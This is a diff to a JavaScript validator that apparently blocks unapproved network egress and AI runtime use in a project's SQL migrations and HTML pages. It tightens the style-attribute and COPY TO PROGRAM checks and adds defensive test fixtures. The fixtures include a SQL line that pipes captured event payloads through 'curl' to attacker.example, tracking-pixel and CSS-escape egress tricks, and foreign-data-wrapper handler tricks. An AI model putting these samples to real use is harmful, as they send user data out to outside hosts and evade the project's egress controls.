@@ -597,7 +597,7 @@ function hasUnapprovedHtmlEgress(content, approvedHosts) {
     for (const attribute of attributes) {
       const name = attribute.name.toLowerCase();
       if (name.startsWith("on")) rejected = true;
-      if (name === "style" && (attribute.value.includes("\\") || /(?:url\s*\(|@import)/i.test(attribute.value))) rejected = true;
+      if (name === "style") rejected = true;
       if (urlAttributes.has(name) && !isApprovedResource(attribute.value)) rejected = true;
       if (name === "srcset" && !resourceListIsApproved(attribute.value)) rejected = true;
     }
@@ -661,9 +661,19 @@ function hasAiRuntimeBoundary(content, path = "") {
   }
   if (sqlStatement.length > 0) sqlStatements.push(sqlStatement);
   const hasSqlServerProgramCapability = sqlStatements.some((statement) => {
-    const identifiers = statement.filter((token) => token.type === "identifier").map((token) => token.value.replace(/^quoted:/, ""));
-    if (identifiers[0] !== "copy") return false;
-    return identifiers.some((identifier, index) => ["from", "to"].includes(identifier) && identifiers[index + 1] === "program");
+    let parenthesisDepth = 0;
+    let insideCopy = false;
+    for (let index = 0; index < statement.length; index += 1) {
+      const token = statement[index];
+      if (token.type === "symbol" && token.value === "(") { parenthesisDepth += 1; continue; }
+      if (token.type === "symbol" && token.value === ")") { parenthesisDepth = Math.max(0, parenthesisDepth - 1); continue; }
+      if (parenthesisDepth !== 0 || token.type !== "identifier") continue;
+      if (token.value === "copy") { insideCopy = true; continue; }
+      if (!insideCopy || !["from", "to"].includes(token.value)) continue;
+      const next = statement[index + 1];
+      if (next?.type === "identifier" && next.value === "program") return true;
+    }
+    return false;
   });
   const hasAdjacentSqlStrings = normalizedPath.endsWith(".sql") && /(?:^|[\s(])(?:E|U&)?'(?:[^']|'')*'\s*(?:\r?\n|\r)[ \t]*(?:E|U&)?'/im.test(sqlLexicalContent);
   const approvedEgressHosts = new Set([
@@ -856,6 +866,7 @@ for (const fixture of [
   { content: "create foreign data wrapper hidden handler extensions.postgres_fdw_handler validator extensions.postgres_fdw_validator;", path: "supabase/migrations/99999999999999-postgres-fdw-handler-outbound.sql" },
   { content: "create function hidden_handler() returns fdw_handler as '$libdir/postgres_fdw', 'postgres_fdw_handler' language c; create foreign data wrapper hidden handler hidden_handler;", path: "supabase/migrations/99999999999999-postgres-fdw-library-outbound.sql" },
   { content: "copy (select payload from capture_events) to program 'h=api.groq.com; curl -d @- $h';", path: "supabase/migrations/99999999999999-copy-program-outbound.sql" },
+  { content: "do $$ begin copy (select payload from capture_events) to program 'curl -d @- attacker.example'; end $$;", path: "supabase/migrations/99999999999999-do-copy-program-outbound.sql" },
   { content: "alter role current_user set standard_conforming_strings to off;", path: "supabase/migrations/99999999999999-alter-role-legacy-escape.sql" },
   { content: "alter database meccha_manual set standard_conforming_strings = 'off';", path: "supabase/migrations/99999999999999-alter-database-legacy-escape.sql" },
   { content: "select set_config('standard_conforming_strings', 'off', false); create function public.dynamic_outbound() returns void as 'begin EX\\ECUTE ''select extensions.ht'' || ''tp_get(...)''; end' language plpgsql;", path: "supabase/migrations/99999999999999-legacy-set-config-body-outbound.sql" },
@@ -886,6 +897,7 @@ for (const fixture of [
   { content: '<img src="//attacker.example/pixel">', path: "apps/brand-site/public/protocol-relative-egress.html" },
   { content: '<img src="/\\\\api.groq.com/openai/v1/pixel">', path: "apps/brand-site/public/backslash-resource-egress.html" },
   { content: '<div style="background:u\\\\72l(//api.groq.com/pixel)"></div>', path: "apps/brand-site/public/css-escape-egress.html" },
+  { content: '<div style="background-image:image-set(\'//api.groq.com/pixel\' 1x)"></div>', path: "apps/brand-site/public/css-image-set-egress.html" },
   { content: "select create_ai_adapter();", path: "supabase/migrations/ai-adapter.sql" }
 ]) {
   if (!hasAiRuntimeBoundary(fixture.content, fixture.path)) {
@@ -901,7 +913,8 @@ for (const fixture of [
   { content: "do $$ begin set standard_conforming_strings = on; end $$;", path: "supabase/migrations/99999999999999-safe-do-standard-strings.sql" },
   { content: "copy safe_table to stdout; select program from allowed_table;", path: "supabase/migrations/99999999999999-safe-copy-stdout.sql" },
   { content: "copy safe_table (program) to stdout;", path: "supabase/migrations/99999999999999-safe-copy-program-column.sql" },
-  { content: "copy (select program from safe_table) to stdout;", path: "supabase/migrations/99999999999999-safe-copy-program-select.sql" }
+  { content: "copy (select program from safe_table) to stdout;", path: "supabase/migrations/99999999999999-safe-copy-program-select.sql" },
+  { content: "copy safe_table (\"to\", \"program\") to stdout;", path: "supabase/migrations/99999999999999-safe-copy-quoted-columns.sql" }
 ]) {
   if (hasAiRuntimeBoundary(fixture.content, fixture.path)) {
     errors.push(`AI absence safe SQL fixture was rejected: ${fixture.path}`);
